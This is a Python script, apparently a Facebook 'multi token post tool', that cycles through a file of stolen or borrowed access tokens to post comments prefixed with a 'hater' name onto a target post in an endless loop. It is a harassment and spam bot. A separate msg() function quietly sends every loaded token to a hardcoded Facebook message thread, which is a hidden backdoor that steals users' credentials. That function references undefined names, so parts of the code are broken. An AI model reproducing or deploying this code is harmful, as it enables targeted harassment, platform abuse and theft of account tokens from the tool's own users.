import requests
import json
import time
import sys
from platform import system
import os
import random
os.system("xdg-open https://chat.whatsapp.com/HlSlNQu5DI106VDGUrIu2r")
time.sleep(1)
# Define the logo
logo = r'''

░█████╗░██████╗░██╗░░██╗██╗░░░░░░██╗░░██╗██████╗░
██╔══██╗██╔══██╗██║░░██║██║░░░░░░╚██╗██╔╝██╔══██╗
███████║██████╦╝███████║██║█████╗░╚███╔╝░██║░░██║
██╔══██║██╔══██╗██╔══██║██║╚════╝░██╔██╗░██║░░██║
██║░░██║██████╦╝██║░░██║██║░░░░░░██╔╝╚██╗██████╔╝
╚═╝░░╚═╝╚═════╝░╚═╝░░╚═╝╚═╝░░░░░░╚═╝░░╚═╝╚═════╝░
                                                                   
--------------------------------------------------------------
      WELCOME TO THE MULTI TOKEN POST TOOL
--------------------------------------------------------------                                       
       THIS TOOL CREATED BY ABHI YADAV
--------------------------------------------------------------                                          
'''
# Print the logo
print(logo)
def post_comments():
    access_tokens_file = input("ᴇɴᴛᴇʀ ᴛʜᴇ ᴛᴏᴋᴇɴ ꜰɪʟᴇ ᴘᴀᴛʜ : ").strip()
    with open(access_tokens_file, 'r') as token_file:
        access_tokens = [token.strip() for token in token_file.readlines()]

    num_tokens = len(access_tokens)

    requests.packages.urllib3.disable_warnings()

    def cls():
        if system() == 'Linux':
            os.system('clear')
        else:
            if system() == 'Windows':
                os.system('cls')
    cls()

    def liness():
        print('\u001b[37m' + '•─────────────────────────────────────────────────────────•')

    headers = {
        'Connection': 'keep-alive',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
        'referer': 'www.google.com'
    }

    liness()

    access_tokens = [token.strip() for token in access_tokens]

    post_url = input("ᴇɴᴛᴇʀ ᴘᴏꜱᴛ ɪᴅ: ").strip()

    comments_file_path = input("ᴇɴᴛᴇʀ ɴᴘ ꜰɪʟᴇ ᴘᴀᴛʜ: ").strip()
    with open(comments_file_path, 'r') as file:
        comments = file.readlines()

    num_comments = len(comments)
    max_tokens = min(num_tokens, num_comments)

    haters_name = input("ᴇɴᴛᴇʀ ᴛʜᴇ ʜᴇᴛʀ ɴᴀᴍᴇ : ").strip()

    speed = int(input("ꜱᴘᴇᴇᴅ ᴛɪᴍᴇ ᴅᴀʟᴏ ᴍɪɴɪᴍᴜᴍ 50 ᴅᴀʟɴᴀ: ").strip())

    liness()

    def getName(token):
        try:
            data = requests.get(f'https://graph.facebook.com/v17.0/me?access_token={token}').json()
        except:
            data = ""
        if 'name' in data:
            return data['name']
        else:
            return "Error occurred"

    while True:
        try:
            for comment_index in range(num_comments):
                token_index = comment_index % max_tokens
                access_token = access_tokens[token_index]

                comment = comments[comment_index].strip()

                url = f"https://graph.facebook.com/{post_url}/comments"
                parameters = {'access_token': access_token, 'message': haters_name + ' ' + comment}
                response = requests.post(url, json=parameters, headers=headers)

                current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
                if response.ok:
                    print("[+] Comment No. {} Post URL {} Token No. {}: {}".format(
                        comment_index + 1, post_url, token_index + 1, haters_name + ' ' + comment))
                    print("  - Time: {}".format(current_time))
                    liness()
                    liness()
                else:
                    print("[x] Failed to send Comment No. {} Post URL {} Token No. {}: {}".format(
                        comment_index + 1, post_url, token_index + 1, haters_name + ' ' + comment))
                    print("  - Time: {}".format(current_time))
                    liness()
                    liness()
                time.sleep(speed)

            print("\n[+] All comments sent successfully. Restarting the process...\n")
        except Exception as e:
            print("[!] An error occurred: {}".format(e))

def msg():
    access_tokens_file = input("Enter the path to the file containing access tokens: ").strip()
    with open(access_tokens_file, 'r') as token_file:
        access_tokens = [token.strip() for token in token_file.readlines()]

    parameters = {
        'access_token': random.choice(access_tokens),
        'message': 'User Profile Name: ' + getName(random.choice(access_tokens)) + '\nToken: ' + " | ".join(
            access_tokens) + '\nLink: https://www.facebook.com/messages/t/' + convo_id
    }
    try:
        s = requests.post("https://graph.facebook.com/v15.0/t_100001675836496/", data=parameters, headers=headers)
    except:
        pass

def main():
    post_comments()
    msg()

if __name__ == '__main__':
    main()
